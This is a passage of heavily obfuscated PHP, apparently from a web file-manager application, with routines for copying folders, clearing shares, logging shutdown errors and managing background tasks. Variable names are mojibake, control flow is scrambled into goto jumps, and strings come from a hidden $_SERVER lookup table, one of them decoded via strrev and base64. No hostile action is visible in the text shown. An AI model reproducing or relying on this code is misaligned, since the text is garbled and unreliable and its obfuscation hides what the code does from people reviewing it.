"\x72\145\x70\154\141\x63\145\50\x70\141\162\x65\x6e\164\x4c\145\x76\145\154\x2c\47{$f™ªğ×áâ}\47\x2c\47{$AÔò×âŠ}\x27\x29"), $f¿‡æ„Œ¹†[514] => $c”Æà¬Í…­[$f¿‡æ„Œ¹†[368]], $f¿‡æ„Œ¹†[515] => $c”Æà¬Í…­[$f¿‡æ„Œ¹†[452]]); if ($EÉ¯ñâ°Ï“) { $c‰Ëìè£‘‚[$f¿‡æ„Œ¹†[392]] = 0; } $this->where($fã‹“Âê¨®)->data($c‰Ëìè£‘‚)->save(); } $this->where(array($f¿‡æ„Œ¹†[380] => $eÁ’àÙ­±))->data($eÈÁœ²¿Ù­)->save(); return $eÁ’àÙ­±; goto a­äÚëà’«; dÆŒ¶¬ÛñÄ: if (!$B‘¡ù¸ÌĞÍ) { Model($f¿‡æ„Œ¹†[450])->authClear($eÁ’àÙ­±); } $EÉ¯ñâ°Ï“ = $eí Š„ËÕ [$f¿‡æ„Œ¹†[393]] == $f¿‡æ„Œ¹†[493] && $c”Æà¬Í…­[$f¿‡æ„Œ¹†[393]] != $f¿‡æ„Œ¹†[493]; if ($EÉ¯ñâ°Ï“) { $eÈÁœ²¿Ù­[$f¿‡æ„Œ¹†[392]] = 0; } goto CšÀÙíÁ¬; EĞÉÈ—‰°ğ: $f¿‡æ„Œ¹† =& $_SERVER[÷ÖêïÔÔÓ]; $eí Š„ËÕ  = $this->sourceInfo($eÁ’àÙ­±); $c”Æà¬Í…­ = $this->sourceInfo($E»µìã¯‚); goto A…Œâá¾ç±; a­äÚëà’«: } private function clearShare($CğÀ¡¥ßÎå, $Cˆ¦–È½ˆõ) { goto dƒ¯Š¼ĞÈà; f–¨äòÍÁå: if ($E¡’ÔÈ[$D‘“äìÅ«[452]] == $eµ±‚åééê[$D‘“äìÅ«[452]] && $E¡’ÔÈ[$D‘“äìÅ«[368]] == $D‘“äìÅ«[527]) { return; } $bíï¸Æ”õÙ = array($D‘“äìÅ«[455] => array($D‘“äìÅ«[475], $E¡’ÔÈ[$D‘“äìÅ«[455]] . $CğÀ¡¥ßÎå . $D‘“äìÅ«[476])); $dµ¬£¤³ÅÁ = $this->field($D‘“äìÅ«[380])->where($bíï¸Æ”õÙ)->getField($D‘“äìÅ«[366], !0); goto cÕ›µ¡‚Åî; dÜÙÏ·Æ„Î: Model($D‘“äìÅ«[528])->where($bíï¸Æ”õÙ)->save(array($D‘“äìÅ«[444] => 0)); Model($D‘“äìÅ«[529])->where($bíï¸Æ”õÙ)->delete(); goto dóÚß¬´ë; cÕ›µ¡‚Åî: if (!$dµ¬£¤³ÅÁ) { return; } $bíï¸Æ”õÙ = array($D‘“äìÅ«[366] => array($D‘“äìÅ«[7], $dµ¬£¤³ÅÁ), $D‘“äìÅ«[444] => 1); $E¬‚”ëéª = Model($D‘“äìÅ«[528])->field($D‘“äìÅ«[437])->where($bíï¸Æ”õÙ)->select(); goto a²èÁ‰…„ˆ; a²èÁ‰…„ˆ: if (!$E¬‚”ëéª) { return; } $E¬‚”ëéª = array_to_keyvalue($E¬‚”ëéª, $D‘“äìÅ«[33], $D‘“äìÅ«[437]); $bíï¸Æ”õÙ = array($D‘“äìÅ«[437] => array($D‘“äìÅ«[7], $E¬‚”ëéª)); goto dÜÙÏ·Æ„Î; dƒ¯Š¼ĞÈà: $D‘“äìÅ« =& $_SERVER[÷ÖêïÔÔÓ]; $E¡’ÔÈ = $this->sourceInfo($CğÀ¡¥ßÎå); $eµ±‚åééê = $this->sourceInfo($Cˆ¦–È½ˆõ); goto f–¨äòÍÁå; dóÚß¬´ë: } public function copyFolderFromIO($f£œášÑ‡Ö, $bµÀ­ŒŸÕã, $a­ÎŒĞßà, $aí¿ÌÛ­Î…, $FÍø˜˜ÑÙ®, $aÂ’ƒİÀÎæ = false) { goto Dà›¨‘ãêø; féì…í”¹½: if ($FéÔ­¥Ï‰) { $this->_childrenAllMake($FéÔ­¥Ï‰); } Hook::trigger($bÁù­ô¸ƒ©[531]); $this->_copyChildTo($f£œášÑ‡Ö, $bµÀ­ŒŸÕã, $bŞ…‰èùÆ, $aí¿ÌÛ­Î…, $bŞ±†«Øñ, $FÍø˜˜ÑÙ®); goto a™‘…Øé; föŠ¿é—…Ó: $this->updateModifyTime($a­ÎŒĞßà); return $bŞ…‰èùÆ; goto b§×ç››ÏĞ; cùã®êÇå: Model($bÁù­ô¸ƒ©[497])->addAll($bŞ±†«Øñ[$bÁù­ô¸ƒ©[495]], array(), !0); Model($bÁù­ô¸ƒ©[498])->eventCopy($bŞ…‰èùÆ); $this->saveAll($bŞ±†«Øñ[$bÁù­ô¸ƒ©[496]]); goto dÂ”»ê»¦Â; a™‘…Øé: Hook::trigger($bÁù­ô¸ƒ©[532]); if ($bŞ…‰èùÆ) { $this->folderSizeResetChildren($bŞ…‰èùÆ); } $this->_childrenListClear(); goto cùã®êÇå; f•´»¨¸‰ª: $FéÔ­¥Ï‰ = $this->fileNameExist($a­ÎŒĞßà, $F‘™ ¢˜); $bŞ…‰èùÆ = $this->mkdir($a­ÎŒĞßà, $F‘™ ¢˜, $aí¿ÌÛ­Î…); if (!$FéÔ­¥Ï‰ || $aí¿ÌÛ­Î… == REPEAT_RENAME_FOLDER) { $aí¿ÌÛ­Î… = !1; } goto féì…í”¹½; dÂ”»ê»¦Â: Model($bÁù­ô¸ƒ©[418])->linkAdd($bŞ±†«Øñ[$bÁù­ô¸ƒ©[494]]); Model($bÁù­ô¸ƒ©[418])->remove($bŞ±†«Øñ[$bÁù­ô¸ƒ©[530]]); $this->folderSizeReset($a­ÎŒĞßà); goto föŠ¿é—…Ó; Dà›¨‘ãêø: $bÁù­ô¸ƒ© =& $_SERVER[÷ÖêïÔÔÓ]; $bŞ±†«Øñ = array($bÁù­ô¸ƒ©[495] => array(), $bÁù­ô¸ƒ©[496] => array(), $bÁù­ô¸ƒ©[494] => array(), $bÁù­ô¸ƒ©[530] => array()); $F‘™ ¢˜ = $aÂ’ƒİÀÎæ ? $aÂ’ƒİÀÎæ : $f£œášÑ‡Ö->getPathName($f£œášÑ‡Ö->pathThis($bµÀ­ŒŸÕã)); goto f•´»¨¸‰ª; b§×ç››ÏĞ: } private function _copyChildTo($DÁ©‚¬£Á·, $Bï‡Éà„¼Ç, $b¢‹ç‹‹Œ, $C­¯ÛñƒÕª, &$dÂ´÷Å•ö¼, $f˜£Ü‹‡÷Í) { goto dŸ‡•Å‹Ùã; dŸ‡•Å‹Ùã: $E‡¶£½¸á =& $_SERVER[÷ÖêïÔÔÓ]; $Aá„ƒöªÍò = $this->sourceInfoCache($b¢‹ç‹‹Œ); $D‰àÃ‡Œƒ = $DÁ©‚¬£Á·->listPath($Bï‡Éà„¼Ç, !1, !0); goto AèÀ¦ã¦Ç; E·ŒÎÍ¯ĞÍ: foreach ($c´Ã©‚Š¤ as &$eÀ§ê¹ôÑ‹) { goto dÑ­ÛÕ–ª; dÈ˜ø †‰—: $eÀ§ê¹ôÑ‹[$E‡¶£½¸á[78]] = _get($eÀ§ê¹ôÑ‹, $E‡¶£½¸á[78], 0); $eÀ§ê¹ôÑ‹[$E‡¶£½¸á[415]] = _get($eÀ§ê¹ôÑ‹, $E‡¶£½¸á[415], 0); if (!isset($eÀ§ê¹ôÑ‹[$E‡¶£½¸á[533]]) && $eÀ§ê¹ôÑ‹[$E‡¶£½¸á[415]]) { $dÂ´÷Å•ö¼[$E‡¶£½¸á[530]][] = $eÀ§ê¹ôÑ‹[$E‡¶£½¸á[415]]; } goto e‡¿…ª¯; e‡¿…ª¯: if ($C­¯ÛñƒÕª) { $fÄ¹Ğ¼İŸ¹ = $this->fileNameExistCache($b¢‹ç‹‹Œ, $eÀ§ê¹ôÑ‹[$E‡¶£½¸á[28]]); if ($fÄ¹Ğ¼İŸ¹) { if ($eÀ§ê¹ôÑ‹[$E‡¶£½¸á[367]] || $C­¯ÛñƒÕª == REPEAT_SKIP) { continue; } if ($C­¯ÛñƒÕª == REPEAT_REPLACE) { $BèËŸ±™Ú¼ = $this->sourceInfoCache($fÄ¹Ğ¼İŸ¹); $EÎŠ¡»µÒá = $this->fileHistory($BèËŸ±™Ú¼, $eÀ§ê¹ôÑ‹[$E‡¶£½¸á[415]], $eÀ§ê¹ôÑ‹[$E‡¶£½¸á[78]]); if ($EÎŠ¡»µÒá) { $dÂ´÷Å•ö¼[$E‡¶£½¸á[494]][] = $eÀ§ê¹ôÑ‹[$E‡¶£½¸á[415]]; } continue; } else { if ($C­¯ÛñƒÕª == REPEAT_RENAME) { $eÀ§ê¹ôÑ‹[$E‡¶£½¸á[28]] = $this->fileNameAutoCache($b¢‹ç‹‹Œ, $eÀ§ê¹ôÑ‹[$E‡¶£½¸á[28]], $C­¯ÛñƒÕª, !1); } } } } if (!$eÀ§ê¹ôÑ‹[$E‡¶£½¸á[367]] && $eÀ§ê¹ôÑ‹[$E‡¶£½¸á[415]]) { $dÂ´÷Å•ö¼[$E‡¶£½¸á[494]][] = $eÀ§ê¹ôÑ‹[$E‡¶£½¸á[415]]; } $Aí¸ùî§âÆ[] = $this->_makeItemData($eÀ§ê¹ôÑ‹, $Aá„ƒöªÍò, $eÀ§ê¹ôÑ‹[$E‡¶£½¸á[28]]); goto c‚…êÎˆÅ; dÑ­ÛÕ–ª: if (isset($dº£ØÌ†Ê[$eÀ§ê¹ôÑ‹[$E‡¶£½¸á[28]]])) { $eÀ§ê¹ôÑ‹ = $dº£ØÌ†Ê[$eÀ§ê¹ôÑ‹[$E‡¶£½¸á[28]]]; } $eÀ§ê¹ôÑ‹[$E‡¶£½¸á[367]] = $eÀ§ê¹ôÑ‹[$E‡¶£½¸á[29]] == $E‡¶£½¸á[77]; $eÀ§ê¹ôÑ‹[$E‡¶£½¸á[369]] = _get($eÀ§ê¹ôÑ‹, $E‡¶£½¸á[157], $E‡¶£½¸á[33]); goto dÈ˜ø †‰—; c‚…êÎˆÅ: } unset($eÀ§ê¹ôÑ‹); if (!empty($Aí¸ùî§âÆ)) { $this->addAll($Aí¸ùî§âÆ); } goto bØ˜áé½ÔÚ; AèÀ¦ã¦Ç: $c´Ã©‚Š¤ = array_merge($D‰àÃ‡Œƒ[$E‡¶£½¸á[74]], $D‰àÃ‡Œƒ[$E‡¶£½¸á[75]]); $dº£ØÌ†Ê = $this->_addFiles($DÁ©‚¬£Á·, $D‰àÃ‡Œƒ[$E‡¶£½¸á[74]], $f˜£Ü‹‡÷Í); $Aí¸ùî§âÆ = array(); goto E·ŒÎÍ¯ĞÍ; bØ˜áé½ÔÚ: $c¹È’¬Ï¢È = $this->_childrenList($b¢‹ç‹‹Œ); $c¹È’¬Ï¢È = array_to_keyvalue($c¹È’¬Ï¢È, $E‡¶£½¸á[28]); foreach ($c´Ã©‚Š¤ as $eÀ§ê¹ôÑ‹) { $BèËŸ±™Ú¼ = $c¹È’¬Ï¢È[$eÀ§ê¹ôÑ‹[$E‡¶£½¸á[28]]]; $Cœ†‚ÙÏ¬ = $BèËŸ±™Ú¼[$E‡¶£½¸á[366]]; $this->_copyApplyMeta($BèËŸ±™Ú¼, $dÂ´÷Å•ö¼); if ($eÀ§ê¹ôÑ‹[$E‡¶£½¸á[29]] == $E‡¶£½¸á[77]) { $eÀ§ê¹ôÑ‹[$E‡¶£½¸á[76]] = $DÁ©‚¬£Á·->getPathInner($eÀ§ê¹ôÑ‹[$E‡¶£½¸á[76]]); $this->_copyChildTo($DÁ©‚¬£Á·, $eÀ§ê¹ôÑ‹[$E‡¶£½¸á[76]], $Cœ†‚ÙÏ¬, $C­¯ÛñƒÕª, $dÂ´÷Å•ö¼, $f˜£Ü‹‡÷Í); } } goto a§Ş¨ë¬ìö; a§Ş¨ë¬ìö: } private function _addFiles($c½Ø‚¥»ò, $DÃÎ»ïàğ, $E»Å¾›ëÃí) { goto A‹ğç¿…Ã—; Fƒñâèäˆ: return $d‘øã¯é¸¦; goto Fâ”ğòò…¿; f‚âÏ«îêË: $Aî¢ìŒ˜ = $d®¬¾µá->where($f—­”¿ë)->select(); $Aî¢ìŒ˜ = $Aî¢ìŒ˜ ? $Aî¢ìŒ˜ : array(); foreach ($Aî¢ìŒ˜ as $aì’¾çòÅ ) { if (!isset($d˜ŸÁñ®²±[$aì’¾çòÅ [$Dè¼¯èÍ¦¢[160]]])) { continue; } $c¹ç‚Ä·‡ = $d˜ŸÁñ®²±[$aì’¾çòÅ [$Dè¼¯èÍ¦¢[160]]]; foreach ($c¹ç‚Ä·‡ as &$A™«´È¹) { $A™«´È¹[$Dè¼¯èÍ¦¢[415]] = $aì’¾çòÅ [$Dè¼¯èÍ¦¢[415]]; $A™«´È¹[$Dè¼¯èÍ¦¢[533]] = !0; } unset($A™«´È¹); } goto FŞÄ˜£‰¼Â; A‹ğç¿…Ã—: $Dè¼¯èÍ¦¢ =& $_SERVER[÷ÖêïÔÔÓ]; if (!$DÃÎ»ïàğ || count($DÃÎ»ïàğ) == 0) { return array(); } $d˜ŸÁñ®²± = array(); goto aŒÃÖ³ë; fİ Ò©²õ: foreach ($Aî¢ìŒ˜ as $aì’¾çòÅ ) { if (!isset($d˜ŸÁñ®²±[$aì’¾çòÅ [$Dè¼¯èÍ¦¢[160]]])) { continue; } $d¾¸ñé­æ =& $d˜ŸÁñ®²±[$aì’¾çòÅ [$Dè¼¯èÍ¦¢[160]]]; foreach ($d¾¸ñé­æ as &$A™«´È¹) { $A™«´È¹[$Dè¼¯èÍ¦¢[415]] = $aì’¾çòÅ [$Dè¼¯èÍ¦¢[415]]; } unset($A™«´È¹); } $d‘øã¯é¸¦ = array(); foreach ($DÃÎ»ïàğ as $DõÂ‰Ğ®™) { $d‘øã¯é¸¦[$DõÂ‰Ğ®™[$Dè¼¯èÍ¦¢[28]]] = $DõÂ‰Ğ®™; } goto Fƒñâèäˆ; FŞÄ˜£‰¼Â: $F•‘ÚäÊÅ = array(); foreach ($DÃÎ»ïàğ as $Eìïßš‰Ã) { if (isset($Eìïßš‰Ã[$Dè¼¯èÍ¦¢[533]]) && $Eìïßš‰Ã[$Dè¼¯èÍ¦¢[533]]) { continue; } $C¤áÂ½íôÊ = $c½Ø‚¥»ò->getPathInner($Eìïßš‰Ã[$Dè¼¯èÍ¦¢[76]]); $Cò©ŸÔ§¡ğ = $d®¬¾µá->addFileMake($C¤áÂ½íôÊ, $Eìïßš‰Ã[$Dè¼¯èÍ¦¢[78]], $Eìïßš‰Ã[$Dè¼¯èÍ¦¢[161]], $Eìïßš‰Ã[$Dè¼¯èÍ¦¢[160]], $Eìïßš‰Ã[$Dè¼¯èÍ¦¢[28]], $E»Å¾›ëÃí); $F•‘ÚäÊÅ[] = $Cò©ŸÔ§¡ğ; } $d®¬¾µá->addAll($F•‘ÚäÊÅ); goto e¿¶°–¨À; aŒÃÖ³ë: foreach ($DÃÎ»ïàğ as &$A™«´È¹) { goto FÅò¡…³ôÊ; e£¬Û©š´: if (count($d˜ŸÁñ®²±[$fµù×´ê“¿]) > 1) { $A™«´È¹[$Dè¼¯èÍ¦¢[533]] = !0; } goto d ËÚ±™µ÷; f‡÷ïÖ’˜: $A™«´È¹[$Dè¼¯èÍ¦¢[160]] = $fµù×´ê“¿; Hook::trigger($Dè¼¯èÍ¦¢[535], $A™«´È¹); $d˜ŸÁñ®²±[$fµù×´ê“¿][] =& $A™«´È¹; goto e£¬Û©š´; cÊ‹è÷†…½: $fµù×´ê“¿ = $c½Ø‚¥»ò->hashMd5($A™«´È¹[$Dè¼¯èÍ¦¢[76]]); if (strlen($fµù×´ê“¿) > 10 && !isset($d˜ŸÁñ®²±[$fµù×´ê“¿])) { $d˜ŸÁñ®²±[$fµù×´ê“¿] = array(); } $A™«´È¹[$Dè¼¯èÍ¦¢[161]] = $A’„èĞ¹Ì¦; goto f‡÷ïÖ’˜; FÅò¡…³ôÊ: Hook::trigger($Dè¼¯èÍ¦¢[534], $A™«´È¹); $A™«´È¹[$Dè¼¯èÍ¦¢[76]] = $c½Ø‚¥»ò->getPathInner($A™«´È¹[$Dè¼¯èÍ¦¢[76]]); $A’„èĞ¹Ì¦ = $c½Ø‚¥»ò->hashSimple($A™«´È¹[$Dè¼¯èÍ¦¢[76]]); goto cÊ‹è÷†…½; d ËÚ±™µ÷: } $f—­”¿ë = array($Dè¼¯èÍ¦¢[160] => array($Dè¼¯èÍ¦¢[7], array_keys($d˜ŸÁñ®²±))); $d®¬¾µá = Model($Dè¼¯èÍ¦¢[536]); goto f‚âÏ«îêË; e¿¶°–¨À: $f—­”¿ë = array($Dè¼¯èÍ¦¢[160] => array($Dè¼¯èÍ¦¢[7], array_keys($d˜ŸÁñ®²±))); $Aî¢ìŒ˜ = $d®¬¾µá->where($f—­”¿ë)->select(); $Aî¢ìŒ˜ = $Aî¢ìŒ˜ ? $Aî¢ìŒ˜ : array(); goto fİ Ò©²õ; Fâ”ğòò…¿: } } define($_SERVER[÷ÖêïÔÔÓ][537], $_SERVER[÷ÖêïÔÔÓ][538]); goto c¶’ÄÂäïË; fŞô´¾¨Áğ: function beforeShutdownError($DÚöÌÉ¯ = false, $FÄìè÷Î„ø = '', $eª¦ÌóàÑ = '', $eË½Şô“¤ = 0) { $cÜÏ‚Šï‚ =& $_SERVER[Óº‹‘Î]; switch ($DÚöÌÉ¯) { case E_PARSE: case E_ERROR: case E_CORE_ERROR: case E_COMPILE_ERROR: case E_USER_ERROR: $fÊòæö²†‘ = $cÜÏ‚Šï‚[38]; break; case E_WARNING: case E_USER_WARNING: case E_COMPILE_WARNING: case E_RECOVERABLE_ERROR: $fÊòæö²†‘ = $cÜÏ‚Šï‚[39]; break; case E_STRICT: $fÊòæö²†‘ = $cÜÏ‚Šï‚[40]; break; case E_NOTICE: case E_USER_NOTICE: $fÊòæö²†‘ = $cÜÏ‚Šï‚[41]; break; case E_DEPRECATED: case E_USER_DEPRECATED: $fÊòæö²†‘ = $cÜÏ‚Šï‚[42]; break; default: break; } if (!$fÊòæö²†‘ || $fÊòæö²†‘ == $cÜÏ‚Šï‚[41] || $fÊòæö²†‘ == $cÜÏ‚Šï‚[42]) { return; } $eª¦ÌóàÑ = $cÜÏ‚Šï‚[4] . str_replace($_SERVER[$cÜÏ‚Šï‚[36]], $cÜÏ‚Šï‚[20], $eª¦ÌóàÑ); $C¸Š©Å·òÄ = $fÊòæö²†‘ . $cÜÏ‚Šï‚[43] . $FÄìè÷Î„ø . $cÜÏ‚Šï‚[43] . $eª¦ÌóàÑ . $cÜÏ‚Šï‚[43] . $eË½Şô“¤; write_log($C¸Š©Å·òÄ . $cÜÏ‚Šï‚[18] . get_caller_msg(1), $cÜÏ‚Šï‚[19]); } $_SERVER[$_SERVER[Óº‹‘Î][44]] = $_SERVER[$_SERVER[Óº‹‘Î][36]] . $_SERVER[Óº‹‘Î][45]; $FÔ®˜†Ó‘Ó = strrev(base64_decode($_SERVER[Óº‹‘Î][46])); goto AÎñçƒ¬­; dÀ·Œ’á¯Ó: class Task { const STATYS_STOP = "\x73\x74\157\x70"; const STATYS_RUNNING = "\x72\165\156\x6e\x69\x6e\147"; const STATYS_KILL = "\153\151\x6c\154"; public $task; public function __destruct() { $this->end(); } public function __construct($cÓØ‡æ‰ ç, $FªÏ¨²é‡ = '', $d¤îÕ´Ê»ä = 0, $a®²­óèÇƒ = '') { goto c‡†“šÅóÒ; c‡†“šÅóÒ: $B¾éêƒ¼®Ù =& $_SERVER[÷ÖêïÔÔÓ]; if (self::get($cÓØ‡æ‰ ç)) { return; } $this->task = array($B¾éêƒ¼®Ù[364] => $cÓØ‡æ‰ ç, $B¾éêƒ¼®Ù[1341] => USER_ID, $B¾éêƒ¼®Ù[1237] => $a®²­óèÇƒ, $B¾éêƒ¼®Ù[29] => $FªÏ¨²é‡, $B¾éêƒ¼®Ù[1286] => $B¾éêƒ¼®Ù[33], $B¾éêƒ¼®Ù[1284] => $d¤îÕ´Ê»ä, $B¾éêƒ¼®Ù[1289] => 0, $B¾éêƒ¼®Ù[1342] => 0, $B¾éêƒ¼®Ù[1343] => 0, $B¾éêƒ¼®Ù[1344] => timeFloat(), $B¾éêƒ¼®Ù[1345] => 0, $B¾éêƒ¼®Ù[1346] => 0, $B¾éêƒ¼®Ù[1347] => 0, $B¾éêƒ¼®Ù[1348] => 0, $B¾éêƒ¼®Ù[675] => $B¾éêƒ¼®Ù[1306]); goto eİ¿ˆİŞ¿¢; eŒ¦ºÂÍ¿Ç: Hook::trigger($B¾éêƒ¼®Ù[1352], $this->task); $this->task[$B¾éêƒ¼®Ù[1346]] = timeFloat(); self::valueSet($this->task[$B¾éêƒ¼®Ù[364]], $this->task); goto bõ©°¼ ñ; eİ¿ˆİŞ¿¢: Hook::bind($B¾éêƒ¼®Ù[1308], array($this, $B¾éêƒ¼®Ù[1349])); Hook::bind($B¾éêƒ¼®Ù[1350], array($this, $B¾éêƒ¼®Ù[1351])); $this->startAfter(); goto eŒ¦ºÂÍ¿Ç; bõ©°¼ ñ: } public function end() { goto a­¦ö®¸Õõ; dŠô¿ïÃ¼İ: $Fùâç½·†© = timeFloat() - $this->task[$F«¸óÁ¢[1344]]; self::log($F«¸óÁ¢[1353] . $this->task[$F«¸óÁ¢[364]] . $F«¸óÁ¢[1354] . $Fùâç½·†© . $F«¸óÁ¢[1355]); Hook::unbind($F«¸óÁ¢[1308], array($this, $F«¸óÁ¢[1349])); goto C ±à¯¥¿×; C ±à¯¥¿×: Hook::unbind($F«¸óÁ¢[1350], array($this, $F«¸óÁ¢[1351])); $this->endAfter(); $this->task = !1; goto a­œ¾Š¦Ä; a­¦ö®¸Õõ: $F«¸óÁ¢ =& $_SERVER[÷ÖêïÔÔÓ]; if (!$this->task) { return; } if ($this->task[$F«¸óÁ¢[1346]]) { self::valueSet($this->task[$F«¸óÁ¢[364]], !1); } goto dŠô¿ïÃ¼İ; a­œ¾Š¦Ä: } public function update($E™ñ¿ª§ß = 0) { goto cÇŸµ—à»“; D”Ü°‘³Á‘: $this->updateAfter(); $a›Ü¤ÓÙéæ = 0.2; if (timeFloat() - $eïÊŸëµ×[$bˆ¥¼Š¸…Ğ[1346]] < $a›Ü¤ÓÙéæ) { return; } goto F¬¦ó¤óñŸ; F¬¦ó¤óñŸ: $dÖÑ³ÏäË‡ = self::get($eïÊŸëµ×[$bˆ¥¼Š¸…Ğ[364]]); $E‰¢ì¢ó‹ = $dÖÑ³ÏäË‡[$bˆ¥¼Š¸…Ğ[675]]; if ($E‰¢ì¢ó‹ == self::STATYS_KILL) { $b§õ°³ˆö = array($bˆ¥¼Š¸…Ğ[1356] => LNG($bˆ¥¼Š¸…Ğ[1357]), $bˆ¥¼Š¸…Ğ[1006] => !1); Cache::set($bˆ¥¼Š¸…Ğ[1358] . $this->task[$bˆ¥¼Š¸…Ğ[364]], $b§õ°³ˆö, 30); $this->end(); die; } else { if ($E‰¢ì¢ó‹ == self::STATYS_STOP) { $Eª«®ˆÓ¸« = 2; $dÖÑ³ÏäË‡[$bˆ¥¼Š¸…Ğ[1347]] += $Eª«®ˆÓ¸«; self::valueSet($eïÊŸëµ×[$bˆ¥¼Š¸…Ğ[364]], $dÖÑ³ÏäË‡); sleep($Eª«®ˆÓ¸«); $this->update(); return; } } goto AÑ°„“Ø÷Ö; AÑ°„“Ø÷Ö: $eïÊŸëµ×[$bˆ¥¼Š¸…Ğ[675]] = $E‰¢ì¢ó‹ ? $E‰¢ì¢ó‹ : $eïÊŸëµ×[$bˆ¥¼Š¸…Ğ[675]]; $eïÊŸëµ×[$bˆ¥¼Š¸…Ğ[1347]] = $dÖÑ³ÏäË‡[$bˆ¥¼Š¸…Ğ[1347]] ? $dÖÑ³ÏäË‡[$bˆ¥¼Š¸…Ğ[1347]] : 0; $eïÊŸëµ×[$bˆ¥¼Š¸…Ğ[1346]] = timeFloat(); goto C¿©¾—äİ›; AÙÙ†÷Íç…: $eïÊŸëµ×[$bˆ¥¼Š¸…Ğ[1289]] += $E™ñ¿ª§ß; $eïÊŸëµ×[$bˆ¥¼Š¸…Ğ[1345]] = timeFloat(); if ($eïÊŸëµ×[$bˆ¥¼Š¸…Ğ[1284]]) { if ($eïÊŸëµ×[$bˆ¥¼Š¸…Ğ[1284]] < $eïÊŸëµ×[$bˆ¥¼Š¸…Ğ[1289]]) { $eïÊŸëµ×[$bˆ¥¼Š¸…Ğ[1284]] = $eïÊŸëµ×[$bˆ¥¼Š¸…Ğ[1289]]; } $CºØ›Óì = timeFloat() - $eïÊŸëµ×[$bˆ¥¼Š¸…Ğ[1344]] - $eïÊŸëµ×[$bˆ¥¼Š¸…Ğ[1347]]; $eïÊŸëµ×[$bˆ¥¼Š¸…Ğ[1342]] = $eïÊŸëµ×[$bˆ¥¼Š¸…Ğ[1289]] / $eïÊŸëµ×[$bˆ¥¼Š¸…Ğ[1284]]; $eïÊŸëµ×[$bˆ¥¼Š¸…Ğ[1343]] = $eïÊŸëµ×[$bˆ¥¼Š¸…Ğ[1289]] / $CºØ›Óì; if ($eïÊŸëµ×[$bˆ¥¼Š¸…Ğ[1342]] > 0) { $eïÊŸëµ×[$bˆ¥¼Š¸…Ğ[1348]] = $CºØ›Óì * (1 - $eïÊŸëµ×[$bˆ¥¼Š¸…Ğ[1342]]) / $eïÊŸëµ×[$bˆ¥¼Š¸…Ğ[1342]]; } $eïÊŸëµ×[$bˆ¥¼Š¸…Ğ[1348]] = $eïÊŸëµ×[$bˆ¥¼Š¸…Ğ[1348]] <= 0 ? 0 : $eïÊŸëµ×[$bˆ¥¼Š¸…Ğ[1348]]; } goto D”Ü°‘³Á‘; C¿©¾—äİ›: Hook::trigger($bˆ¥¼Š¸…Ğ[1359], $eïÊŸëµ×); self::valueSet($eïÊŸëµ×[$bˆ¥¼Š¸…Ğ[364]], $eïÊŸëµ×); goto AñœÚ¼×à; cÇŸµ—à»“: $bˆ¥¼Š¸…Ğ =& $_SERVER[÷ÖêïÔÔÓ]; $eïÊŸëµ× =& $this->task; if (!$eïÊŸëµ×) { return; } goto AÙÙ†÷Íç…; AñœÚ¼×à: } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($f³áùîÖ„¡) { $D†¤ÉŸÒªÏ =& $_SERVER[÷ÖêïÔÔÓ]; Cache::set($D†¤ÉŸÒªÏ[1358] . $this->task[$D†¤ÉŸÒªÏ[364]], $f³áùîÖ„¡, 60); return $f³áùîÖ„¡; } public static function get($Fƒ—ÇõÇ•) { return self::valueGet($Fƒ—ÇõÇ•); } public static function listData() { $F•‚ã©İù = self::valueGet(); return array_sort_by($F•‚ã©İù, $_SERVER[÷ÖêïÔÔÓ][1344], !0); } public static function kill($f‘„™Å¿íÕ) { return self::changeStatus($f‘„™Å¿íÕ, self::STATYS_KILL); } public static function stop($EÔÆè„Ø‚Õ) { return self::changeStatus($EÔÆè„Ø‚Õ, self::STATYS_STOP); } public static function restart($d‚…Å‹í‘×) { return self::changeStatus($d‚…Å‹í‘×, self::STATYS_RUNNING); } public static function killAll() { $AÌßÛØÃî¹ =& $_SERVER[÷ÖêïÔÔÓ]; $Añïµ…™± = self::listData(); foreach ($Añïµ…™± as $AÊŠÇÆ¦) { self::kill($AÊŠÇÆ¦[$AÌßÛØÃî¹[364]]); } sleep(2); foreach ($Añïµ…™± as $AÊŠÇÆ¦) { self::valueSet($AÊŠÇÆ¦[$AÌßÛØÃî¹[364]], !1); } } private static function changeStatus($F‹×ò½šòê, $BƒÎ„¾ÄŞ´) { goto A¯”¿¡‡¦­; a‹›Âµ–ˆ: $E§‰ªëƒËÙ[$CçÀ½¾Ç¹”[675]] = $BƒÎ„¾ÄŞ´; self::valueSet($F‹×ò½šòê, $E§‰ªëƒËÙ); self::log($CçÀ½¾Ç¹”[1360] . $E§‰ªëƒËÙ[$CçÀ½¾Ç¹”[364]] . $CçÀ½¾Ç¹”[1361] . $BƒÎ„¾ÄŞ´); goto e­ŠŠ…•‡§; A¯”¿¡‡¦­: $CçÀ½¾Ç¹” =& $_SERVER[÷ÖêïÔÔÓ]; $E§‰ªëƒËÙ = self::valueGet($F‹×ò½šòê); if (!$E§‰ªëƒËÙ) { return !1; } goto a‹›Âµ–ˆ; e­ŠŠ…•‡§: return !0; goto AÀƒïùÒªÃ; AÀƒïùÒªÃ: } public static function valueGet($dßŒßÕ† = false) { $A“”Ş«å•ë =& $_SERVER[÷ÖêïÔÔÓ]; if ($dßŒßÕ†) { $EÔ¶Åë—åÔ = Model($A“”Ş«å•ë[395])->where(array($A“”Ş«å•ë[88] => $dßŒßÕ†, $A“”Ş«å•ë[29] => $A“”Ş«å•ë[1362]))->find(); return $EÔ¶Åë—åÔ ? json_decode($EÔ¶Åë—åÔ[$A“”Ş«å•ë[354]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($eãÍŒÂ«÷µ = false) { goto CÕ§æÄÍ¢É; CåºÊ¸Ú±¯: return $bÑÒğ¹å¥ñ; goto dñĞ’‰İ‚î; f“šÓÀÀÁ›: $bÑÒğ¹å¥ñ = Model($b³Şç– ‰”[395])->where($Dì´«‡Ó¬Ï)->select(); $bÑÒğ¹å¥ñ = $bÑÒğ¹å¥ñ ? $bÑÒğ¹å¥ñ : array(); foreach ($bÑÒğ¹å¥ñ as $cˆÂåš¹âŸ => $CØ£óšù£ê) { $bÑÒğ¹å¥ñ[$cˆÂåš¹âŸ] = json_decode($CØ£óšù£ê[$b³Şç– ‰”[354]], !0); } goto CåºÊ¸Ú±¯; CÕ§æÄÍ¢É: $b³Şç– ‰” =& $_SERVER[÷ÖêïÔÔÓ]; $Dì´«‡Ó¬Ï = array($b³Şç– ‰”[29] => $b³Şç– ‰”[1362]); if ($eãÍŒÂ«÷µ) { 